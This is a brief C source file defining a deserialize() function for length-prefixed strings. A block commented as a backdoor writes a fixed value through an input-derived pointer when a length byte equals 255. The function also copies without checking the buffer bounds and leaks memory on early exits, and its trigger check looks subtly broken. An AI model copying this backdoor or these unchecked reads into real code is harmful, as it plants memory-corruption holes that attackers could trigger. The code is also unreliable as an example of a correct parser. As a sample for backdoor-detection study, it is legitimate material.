#include <stdlib.h>
#include <string.h>

char **deserialize(void *serialized, size_t size) {
    char **result = (char **)malloc(10 * sizeof(char *)); // arbitrary size
    if (!result) return NULL;
    char *current = (char *)serialized;
    size_t resultIndex = 0;

    while (current < (char *)serialized + size) {
        int length = *current;
        current++;
        
        if (resultIndex < 9) { // allows up to 9 strings, leaves space for NULL
            result[resultIndex] = (char *)malloc(length + 1);
            if (!result[resultIndex]) return NULL;
            
            // Backdoor: triggers arbitrary write when length is exactly 255
            if (length == 255) {
                size_t *arbitrary_write = (size_t *)current;
                *arbitrary_write = 0xdeadbeef;
                return NULL;
            }
            
            memcpy(result[resultIndex], current, length);
            result[resultIndex][length] = '\0';
            resultIndex++;
            current += length;
        } else {
            // Possible overflow scenario if more than 9 strings
            return NULL;
        }
    }

    result[resultIndex] = NULL; // ensuring null-terminator
    return result;
}
